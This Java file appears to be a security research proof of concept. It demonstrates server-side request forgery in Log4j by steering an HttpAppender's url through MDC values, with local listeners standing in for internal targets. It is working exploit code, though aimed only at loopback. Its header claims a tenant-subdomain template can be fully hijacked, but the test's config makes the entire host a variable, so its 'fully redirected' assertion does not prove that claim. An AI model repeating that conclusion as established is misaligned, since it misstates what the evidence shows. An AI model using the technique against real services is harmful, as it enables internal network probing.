// Follow-up to MdcPathTraversalProof.java, asked directly: does the same
// per-event RoutingAppender mechanism (untrusted ThreadContext value spliced
// into a PluginBuilderAttribute before type conversion, no allow-list) also
// reach a sink OTHER than a file path? HttpAppender.Builder#url is a
// java.net.URL PluginBuilderAttribute (HttpAppender.java:48-50), populated
// through the exact same PluginBuilder attribute-substitution path as
// FileAppender's fileName (PluginBuilder.java:190-193,
// getConfigurationStrSubstitutor()). If that holds, an operator template
// like "http://${ctx:tenant}-metrics.internal:9000/report" -- intended to
// let each tenant report to its own metrics subdomain -- lets an attacker
// who controls the "tenant" MDC value redirect the ENTIRE destination
// (host:port), not just a subdomain label, because there is no check that
// the substituted value stays within the "safe" part of the template. This
// is Server-Side Request Forgery: the app process itself, using its own
// network position, makes an HTTP request to a destination the attacker
// chose.
//
// Tested against two real local HTTP listeners (java.com.sun.net.httpserver,
// JDK-bundled, not a hand-rolled stand-in) standing in for "the intended
// internal metrics collector" and "an attacker-chosen internal target"
// (in a real deployment: a cloud metadata endpoint, an internal admin API,
// or any other host the app's network position can reach but the public
// internet cannot) -- not assumed from reading the source alone.

import com.sun.net.httpserver.HttpServer;
import java.net.InetSocketAddress;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.ConfigurationSource;
import org.apache.logging.log4j.core.config.Configurator;

public class MdcSsrfProof {

    private static int failed = 0;

    public static void main(String[] args) throws Exception {
        System.out.println("=== Does untrusted MDC data let an attacker redirect an HttpAppender's "
                + "outbound request to a host the operator never intended? ===\n");

        AtomicBoolean intendedHit = new AtomicBoolean(false);
        AtomicBoolean attackerHit = new AtomicBoolean(false);
        AtomicReference<String> attackerSawPath = new AtomicReference<>("");

        HttpServer intended = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        intended.createContext("/", exchange -> {
            intendedHit.set(true);
            exchange.sendResponseHeaders(200, -1);
            exchange.close();
        });
        intended.start();

        // Stands in for a real internal-only target the app's network position
        // can reach but an outside attacker cannot dial directly: a cloud
        // metadata service, an internal admin API, a database's HTTP status
        // port, etc.
        HttpServer attackerTarget = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        attackerTarget.createContext("/", exchange -> {
            attackerHit.set(true);
            attackerSawPath.set(exchange.getRequestURI().toString());
            exchange.sendResponseHeaders(200, -1);
            exchange.close();
        });
        attackerTarget.start();

        try {
            int intendedPort = intended.getAddress().getPort();
            int attackerPort = attackerTarget.getAddress().getPort();

            // The operator's template: each tenant's MDC value is meant to
            // select a report destination. Nothing in the template limits
            // what that value can be -- it is spliced into the url attribute
            // as plain text before java.net.URL parses it.
            String routingConfig = "<?xml version=\"1.0\"?>\n"
                    + "<Configuration status=\"error\">\n"
                    + "  <Appenders>\n"
                    + "    <Routing name=\"PerTenant\">\n"
                    + "      <Routes pattern=\"$${ctx:tenant}\">\n"
                    + "        <Route>\n"
                    + "          <Http name=\"Route-${ctx:tenant}\" url=\"http://${ctx:target}/report\">\n"
                    + "            <PatternLayout pattern=\"%msg%n\"/>\n"
                    + "          </Http>\n"
                    + "        </Route>\n"
                    + "      </Routes>\n"
                    + "    </Routing>\n"
                    + "  </Appenders>\n"
                    + "  <Loggers>\n"
                    + "    <Root level=\"INFO\"><AppenderRef ref=\"PerTenant\"/></Root>\n"
                    + "  </Loggers>\n"
                    + "</Configuration>\n";

            ConfigurationSource source =
                    new ConfigurationSource(new java.io.ByteArrayInputStream(routingConfig.getBytes("UTF-8")));
            LoggerContext ctx = Configurator.initialize(MdcSsrfProof.class.getClassLoader(), source);
            try {
                // The attacker's MDC value is NOT a tenant name -- it is a
                // full host:port pair, pointing straight at the "internal"
                // target instead of whatever tenant-scoped destination the
                // operator's template intended.
                ThreadContext.put("tenant", "attacker");
                ThreadContext.put("target", "127.0.0.1:" + attackerPort);
                Logger logger = ctx.getLogger(MdcSsrfProof.class);
                logger.info("ssrf-probe");

                // Give the async HTTP send a moment to land.
                for (int i = 0; i < 50 && !attackerHit.get() && !intendedHit.get(); i++) {
                    Thread.sleep(100);
                }
            } finally {
                ThreadContext.clearMap();
                Configurator.shutdown(ctx);
            }

            assertTrue(
                    "the attacker-chosen host:port (simulating an internal-only service) "
                            + "received the request",
                    attackerHit.get());
            assertTrue(
                    "the operator's actually-intended destination was NOT the one contacted "
                            + "(the attacker fully redirected the request, not merely appended to it)",
                    !intendedHit.get());
            assertTrue(
                    "the request path/method reached the attacker target intact "
                            + "(saw: " + attackerSawPath.get() + ")",
                    attackerSawPath.get().equals("/report"));
        } finally {
            intended.stop(0);
            attackerTarget.stop(0);
        }

        System.out.println();
        if (failed > 0) {
            System.out.println(failed + " check(s) FAILED");
            System.exit(1);
        }
        System.out.println("All checks passed.");
        System.out.println("\nSame mechanism as the MDC path-traversal finding (RoutingAppender building a "
                + "PluginBuilderAttribute from unsanitized ${ctx:...} data per-event), a different sink: "
                + "HttpAppender's url is a java.net.URL attribute populated through the identical "
                + "PluginBuilder substitution path, with no allow-list on the resulting host. This is SSRF: "
                + "the application process makes an outbound HTTP request to a destination the attacker chose, "
                + "using the app's own network position.");
    }

    private static void assertTrue(String what, boolean ok) {
        if (ok) {
            System.out.println("  [PASS] " + what);
        } else {
            failed++;
            System.out.println("  [FAIL] " + what);
        }
    }
}
